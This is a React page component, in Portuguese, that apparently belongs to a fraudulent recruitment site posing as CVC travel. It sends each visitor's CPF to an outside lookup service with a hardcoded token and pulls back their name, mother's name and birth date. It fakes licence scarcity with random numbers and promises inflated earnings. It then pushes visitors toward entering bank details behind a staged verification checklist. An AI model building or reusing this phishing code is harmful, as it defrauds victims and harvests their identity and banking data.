import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { MapPin, Users, CheckCircle, TrendingUp, User, Calendar, UserCheck, Heart, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Header from "@/components/header";
import Breadcrumb from "@/components/breadcrumb";
import ProgressiveChecklistLoader from "@/components/progressive-checklist-loader";

interface CPFData {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

export default function Regiao() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [cpfData, setCpfData] = useState<CPFData | null>(null);
  const [isNavigationLoading, setIsNavigationLoading] = useState(false);
  const [loadingPhase, setLoadingPhase] = useState('');
  const [isCheckingAvailability, setIsCheckingAvailability] = useState(true);
  const [availableLicenses, setAvailableLicenses] = useState(0);
  const [locationData, setLocationData] = useState({
    cidade: 'Brasília',
    estado: 'DF',
    cep: '70070-600'
  });

  useEffect(() => {
    // Carregar dados do CEP do localStorage
    const cepData = localStorage.getItem('cepData');
    if (cepData) {
      const parsedData = JSON.parse(cepData);
      setLocationData({
        cidade: parsedData.cidade || 'Brasília',
        estado: parsedData.estado || 'DF', 
        cep: parsedData.cep || '70070-600'
      });
    }
  }, []);

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    
    if (numbers.length <= 3) {
      return numbers;
    } else if (numbers.length <= 6) {
      return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
    } else if (numbers.length <= 9) {
      return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
    } else {
      return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
    }
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value);
    setCpf(formatted);
    setError("");
  };

  const validateCpf = (cpf: string) => {
    const cleanCpf = cpf.replace(/\D/g, "");
    return cleanCpf.length === 11;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateCpf(cpf)) {
      setError("Por favor, insira um CPF válido com 11 dígitos");
      return;
    }

    setIsLoading(true);
    setError("");
    
    try {
      const cleanCpf = cpf.replace(/\D/g, "");
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cleanCpf}`);
      
      if (!response.ok) {
        throw new Error("Erro ao consultar CPF");
      }
      
      const data = await response.json();
      
      if (data.DADOS) {
        setCpfData(data.DADOS);
        // Store CPF data for use across all pages
        localStorage.setItem('validatedCPFData', JSON.stringify(data.DADOS));
        sessionStorage.setItem('cpfData', JSON.stringify(data.DADOS));
      } else {
        setError("CPF não encontrado ou inválido");
      }
    } catch (err) {
      setError("Erro ao consultar CPF. Tente novamente.");
    } finally {
      setIsLoading(false);
    }
  };

  // Check availability on component mount
  useEffect(() => {
    const checkAvailability = () => {
      setTimeout(() => {
        const licenses = Math.floor(Math.random() * 2) + 2; // Random between 2-3
        setAvailableLicenses(licenses);
        setIsCheckingAvailability(false);
      }, 2500);
    };

    checkAvailability();
  }, []);

  const showLoadingAndNavigate = (phase: string, destination: string) => {
    setIsNavigationLoading(true);
    setLoadingPhase(phase);
    setTimeout(() => {
      setIsNavigationLoading(false);
      setLocation(destination);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <Breadcrumb />
      <div className="max-w-4xl mx-auto px-6 py-8">
        {/* Análise da região */}
        <div className="bg-white rounded-lg border border-gray-200 p-6 mb-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <div className="flex items-center gap-2 mb-1">
                <MapPin className="h-4 w-4 text-cvc-blue" />
                <h1 className="text-lg font-semibold text-gray-900">{locationData.cidade}/{locationData.estado}</h1>
              </div>
              <div className="bg-cvc-yellow text-cvc-blue px-2 py-1 rounded text-xs font-medium inline-block">
                CEP: {locationData.cep}
              </div>
            </div>
            <div className="text-right">
              {isCheckingAvailability ? (
                <div className="flex items-center justify-end gap-2">
                  <Loader2 className="h-4 w-4 animate-spin text-cvc-blue" />
                  <div className="text-sm text-cvc-blue">Consultando disponibilidade...</div>
                </div>
              ) : (
                <>
                  <div className="text-sm font-medium text-green-600">✓ Disponível</div>
                  <div className="text-xs text-gray-500">
                    {availableLicenses} {availableLicenses === 1 ? 'licença disponível' : 'licenças disponíveis'}
                  </div>
                </>
              )}
            </div>
          </div>

          <div className="grid md:grid-cols-2 gap-6 pt-4 border-t border-gray-100">
            <div>
              <h3 className="font-medium text-gray-900 mb-3">Atendimento Nacional</h3>
              <div className="space-y-2 text-sm text-gray-700">
                <div>• Atenda a fila de clientes via chat</div>
                <div>• Clientes automáticos diariamente</div>
                <div>• Vendas por link de parceiro personalizado</div>
              </div>
            </div>

            <div>
              <h3 className="font-medium text-gray-900 mb-3">Estimativa de Ganhos</h3>
              <div className="bg-gray-50 rounded-lg p-4 text-left">
                <div className="text-2xl font-bold text-cvc-blue mb-2">R$ 4.500 - R$ 7.200</div>
                <div className="text-sm text-gray-600 mb-3">Estimativa mensal</div>
                <div className="space-y-1 text-xs text-gray-700">
                  <div>• Baseado em 15-25 vendas/mês</div>
                  <div>• Comissão média de 10%</div>
                  <div>• Ticket médio R$ 3.000</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Formulário CPF */}
        <div className="bg-white rounded-lg border border-gray-200 p-6">
          <div className="mb-4">
            <h2 className="text-lg font-semibold text-gray-900">Cadastre sua Documentação</h2>
            <p className="text-sm text-gray-600">Informe seu CPF para se tornar um Agente de Viagens CVC</p>
          </div>

          <form onSubmit={handleSubmit} className="max-w-md">
            <div className="mb-6">
              <label htmlFor="cpf" className="block text-sm font-semibold text-gray-700 mb-2">
                CPF *
              </label>
              <Input
                id="cpf"
                type="text"
                value={cpf}
                onChange={handleCpfChange}
                placeholder="000.000.000-00"
                maxLength={14}
                className={`w-full px-4 py-3 border rounded-lg text-lg text-gray-900 placeholder-gray-400 ${
                  error ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-cvc-blue'
                }`}
              />
              {error && (
                <p className="text-red-500 text-sm mt-1">{error}</p>
              )}
              <p className="text-gray-500 text-xs mt-1">
                Seus dados são protegidos pela LGPD
              </p>
            </div>

            <Button
              type="submit"
              disabled={isLoading || !cpf}
              className="w-full bg-cvc-blue text-white py-3 rounded-lg font-semibold hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="animate-spin w-4 h-4 border-2 border-white border-t-transparent rounded-full"></div>
                  Processando...
                </div>
              ) : (
                "Prosseguir"
              )}
            </Button>
          </form>

          {!cpfData && (
            <div className="mt-4 p-3 bg-gray-50 rounded-lg">
              <p className="text-xs text-gray-600">
                Após confirmar seu CPF, você receberá instruções por e-mail para completar o cadastro.
              </p>
            </div>
          )}
        </div>

        {/* Dados do CPF */}
        {cpfData && (
          <div className="bg-white rounded-lg border border-gray-200 p-6 mt-6">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h2 className="text-lg font-semibold text-gray-900">Cadastro realizado</h2>
                <p className="text-sm text-gray-600">Confirme seus dados abaixo e prossiga</p>
              </div>
              <CheckCircle className="h-5 w-5 text-green-600" />
            </div>

            <div className="grid md:grid-cols-2 gap-4 text-sm">
              <div className="space-y-3">
                <div>
                  <div className="text-gray-600">Nome Completo</div>
                  <div className="font-medium text-gray-900">{cpfData.nome}</div>
                </div>
                <div>
                  <div className="text-gray-600">Nome da Mãe</div>
                  <div className="font-medium text-gray-900">{cpfData.nome_mae}</div>
                </div>
              </div>

              <div className="space-y-3">
                <div>
                  <div className="text-gray-600">Data de Nascimento</div>
                  <div className="font-medium text-gray-900">
                    {new Date(cpfData.data_nascimento).toLocaleDateString('pt-BR')}
                  </div>
                </div>
                <div>
                  <div className="text-gray-600">Sexo</div>
                  <div className="font-medium text-gray-900">
                    {cpfData.sexo === 'M' ? 'Masculino' : 'Feminino'}
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-4 p-3 bg-gray-50 rounded-lg">
              <div className="flex items-center gap-2 mb-1">
                <CheckCircle className="h-4 w-4 text-green-600" />
                <span className="font-medium text-gray-900 text-sm">Dados Corretamente Adicionados</span>
              </div>
              <p className="text-xs text-gray-600">Informações validadas com sucesso. Continue para cadastrar seu recebimento.</p>
            </div>

            <div className="mt-6">
              <Button
                onClick={() => showLoadingAndNavigate('Configurando conta bancária...', '/conta-bancaria')}
                className="w-full bg-cvc-blue text-white py-3 rounded-lg font-semibold hover:bg-blue-700"
              >Prosseguir</Button>
            </div>
          </div>
        )}
      </div>
      {/* Progressive Checklist Loading Screen */}
      {isNavigationLoading && (
        <ProgressiveChecklistLoader 
          title="Configurando Conta Bancária"
          steps={[
            "Verificando dados pessoais",
            "Consultando histórico bancário", 
            "Validando informações de recebimento",
            "Configurando sistema de pagamentos",
            "Preparando acesso aos benefícios"
          ]}
          onComplete={() => {
            setIsNavigationLoading(false);
            setLocation('/conta-bancaria');
          }}
        />
      )}
    </div>
  );
}